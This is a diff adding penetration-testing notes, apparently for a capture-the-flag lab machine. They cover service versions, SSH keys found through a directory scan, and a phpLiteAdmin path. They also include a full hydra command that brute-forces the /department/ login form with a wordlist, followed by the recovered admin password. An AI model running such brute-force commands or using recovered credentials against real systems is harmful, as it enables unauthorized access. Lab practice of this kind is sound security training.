@@ -1,0 +1,18 @@
+Apache/2.4.18 (Ubuntu)
+
+PHP Version 7.0.18-0ubuntu0.16.04.1
+@admin! MySQL is been installed.. please fix the login page! ~amrois -->
+
+ssh public and private key for amrois (but no ssh port known yet)
+from image file found in dirbuster directory scan
+
+phpliteadmin v1.9.?
+at https://10.10.10.43/db/
+
+
+to crack the /department/ admin panel on :80
+hydra -V -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 32 -I
+
+admin
+1q2w3e4r5t
+
